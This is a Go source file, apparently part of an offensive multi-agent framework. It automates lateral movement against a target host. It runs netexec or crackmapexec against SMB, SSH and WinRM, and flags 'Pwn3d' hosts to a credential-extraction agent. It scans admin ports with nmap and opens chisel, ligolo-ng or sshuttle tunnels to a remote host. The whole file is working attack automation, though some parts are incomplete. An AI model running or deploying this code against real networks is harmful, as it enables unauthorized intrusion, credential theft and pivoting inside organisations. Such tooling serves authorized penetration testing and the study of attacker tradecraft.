// PIVOT — Lateral Movement & Tunneling Agent
// netexec (nxc), chisel, ligolo-ng, sshuttle

package netbreach

import (
	"fmt"
	"os/exec"
	"strings"
)

// PivotAgent handles lateral movement and tunneling
type PivotAgent struct {
	bus    *EventBus
	state  *SharedState
	stopCh chan struct{}
	msgCh  chan AgentMessage
}

func NewPivotAgent(bus *EventBus, state *SharedState) *PivotAgent {
	return &PivotAgent{bus: bus, state: state, stopCh: make(chan struct{}), msgCh: make(chan AgentMessage, 100)}
}

func (a *PivotAgent) Name() string  { return "PIVOT" }
func (a *PivotAgent) Status() string { return "online" }

func (a *PivotAgent) Start() {
	a.bus.Subscribe("PIVOT", a.msgCh)
	for {
		select {
		case msg := <-a.msgCh:
			a.Handle(msg)
		case <-a.stopCh:
			return
		}
	}
}

func (a *PivotAgent) Stop() { close(a.stopCh) }

func (a *PivotAgent) Handle(msg AgentMessage) {
	switch msg.Type {
	case "PIVOT":
		a.pivotTarget(msg.Data)
	case "PROTOCOL_CHECK":
		a.protocolCheck(msg.Data)
	case "TUNNEL":
		a.createTunnel(msg.Data)
	}
}

func (a *PivotAgent) broadcast(msg string) {
	a.bus.Broadcast(AgentMessage{From: "PIVOT", To: "ALL", Type: "LOG", Data: msg})
}

func (a *PivotAgent) pivotTarget(target string) {
	a.broadcast(fmt.Sprintf("[PIVOT] Lateral movement on: %s", target))

	// netexec SMB protocol check with credential spray
	a.broadcast("[PIVOT] Checking SMB with netexec...")
	if out, err := exec.Command("nxc", "smb", target, "--users").CombinedOutput(); err == nil {
		output := string(out)
		for _, line := range strings.Split(output, "\n") {
			if strings.Contains(line, "[+]") || strings.Contains(line, "Pwn3d") {
				a.broadcast(fmt.Sprintf("[PIVOT] %s", line))
				// Extract credentials
				if strings.Contains(line, "Pwn3d") {
					a.bus.Broadcast(AgentMessage{From: "PIVOT", To: "EXTRACT", Type: "CREDS_FOUND", Data: target})
				}
			}
		}
	} else {
		// fallback to crackmapexec
		if out2, err2 := exec.Command("crackmapexec", "smb", target).CombinedOutput(); err2 == nil {
			a.broadcast("[PIVOT] crackmapexec SMB check complete")
			_ = out2
		}
	}

	// SSH protocol check
	if out, err := exec.Command("nxc", "ssh", target).CombinedOutput(); err == nil {
		a.broadcast("[PIVOT] SSH check complete")
		_ = out
	}

	// WinRM
	if out, err := exec.Command("nxc", "winrm", target).CombinedOutput(); err == nil {
		a.broadcast("[PIVOT] WinRM check complete")
		_ = out
	}
}

func (a *PivotAgent) protocolCheck(target string) {
	// Quick protocol enumeration with nmap
	if out, err := exec.Command("nmap", "-p", "22,445,3389,5985,5986,1433",
		"--open", target, "-oG", "-").CombinedOutput(); err == nil {
		for _, line := range strings.Split(string(out), "\n") {
			if strings.Contains(line, "Ports:") {
				a.broadcast(fmt.Sprintf("[PIVOT] Open ports: %s", line))
			}
		}
	}
}

func (a *PivotAgent) createTunnel(data string) {
	parts := strings.Split(data, ":")
	if len(parts) < 2 {
		a.broadcast("[!] Usage: TUNNEL <local:remote>")
		return
	}
	local := parts[0]
	remote := parts[1]

	// chisel tunnel
	if out, err := exec.Command("chisel", "client", remote, local).CombinedOutput(); err == nil {
		a.broadcast(fmt.Sprintf("[PIVOT] Chisel tunnel: %s -> %s", local, remote))
		_ = out
	} else {
		// ligolo-ng fallback
		if out2, err2 := exec.Command("ligolo-ng", "-connect", remote).CombinedOutput(); err2 == nil {
			a.broadcast(fmt.Sprintf("[PIVOT] Ligolo tunnel: %s -> %s", local, remote))
			_ = out2
		} else {
			a.broadcast(fmt.Sprintf("[!] Tunnel failed, try manual: sshuttle -r %s 0/0", remote))
		}
	}
}
